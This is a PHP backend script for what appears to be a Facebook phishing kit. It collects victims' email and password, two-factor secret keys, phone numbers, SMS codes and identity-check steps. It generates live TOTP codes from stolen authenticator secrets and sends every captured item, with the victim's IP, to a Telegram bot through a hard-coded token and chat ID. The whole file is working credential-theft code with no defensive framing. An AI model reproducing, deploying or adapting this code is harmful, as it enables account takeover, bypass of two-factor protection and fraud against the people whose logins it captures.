<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// ────────────────────────────────────────────────
// Telegram (use Vercel env vars)
$botToken = $_ENV['TG_TOKEN'] ?? '8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk';
$chatId   = $_ENV['TG_CHAT'] ?? '1622637334';

// ────────────────────────────────────────────────
// Very reliable send function (no DNS tricks needed on Vercel)
function sendTelegram($text) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ];
    file_get_contents($url . '?' . http_build_query($params));
}

// ────────────────────────────────────────────────
// Your original TOTP function (kept identical)
function base32_decode($base32) {
    $base32 = strtoupper(preg_replace('/\s+/', '', $base32));
    $base32 = str_replace('=', '', $base32);
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $bits = '';
    for ($i = 0; $i < strlen($base32); $i++) {
        $val = strpos($alphabet, $base32[$i]);
        if ($val === false) return '';
        $bits .= str_pad(decbin($val), 5, '0', STR_PAD_LEFT);
    }
    $bytes = '';
    for ($i = 0; $i + 8 <= strlen($bits); $i += 8) {
        $bytes .= chr(bindec(substr($bits, $i, 8)));
    }
    return $bytes;
}

function generateTOTP($secret) {
    $key = base32_decode($secret);
    if (empty($key)) return '------';
    $time = floor(time() / 30);
    $time = pack('N*', 0) . pack('N*', $time);
    $hmac = hash_hmac('sha1', $time, $key, true);
    $offset = ord($hmac[strlen($hmac)-1]) & 0x0F;
    $hashpart = substr($hmac, $offset, 4);
    $val = unpack('N', $hashpart)[1] & 0x7FFFFFFF;
    return str_pad($val % 1000000, 6, '0', STR_PAD_LEFT);
}

// ────────────────────────────────────────────────
$step = $_POST['step'] ?? 'unknown';
$ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

$msg = "FB • $step • $ip • $time\n";

$response = ['ok' => true];

if ($step === 'login') {
    $email = trim($_POST['email'] ?? '—');
    $pass  = trim($_POST['pass']  ?? '—');
    $msg .= "📧 $email\n🔑 $pass";
}

else if ($step === 'key') {
    $secret = trim($_POST['secret'] ?? '');
    $msg .= "🗝️ $secret";
    if (strlen($secret) >= 16) {
        $totp = generateTOTP($secret);
        $msg .= "\n🔢 $totp";
        $response['totp'] = $totp;
    }
}

else if ($step === 'done') {
    $msg .= "2FA step passed";
}

else if ($step === 'phone_input') {
    $phone = trim($_POST['phone_number'] ?? '—');
    $msg .= "📱 $phone";
}

else if ($step === 'phone_code_input') {
    $code = trim($_POST['phone_code'] ?? '—');
    $msg .= "📲 $code";
}

else if ($step === 'confirm') {
    $msg .= "Action Required → passed";
}

else if ($step === 'selfie') {
    $msg .= "🎥 Face video claimed";
}

else if ($step === 'id') {
    $msg .= "🪪 ID claimed";
}

sendTelegram($msg);
echo json_encode($response);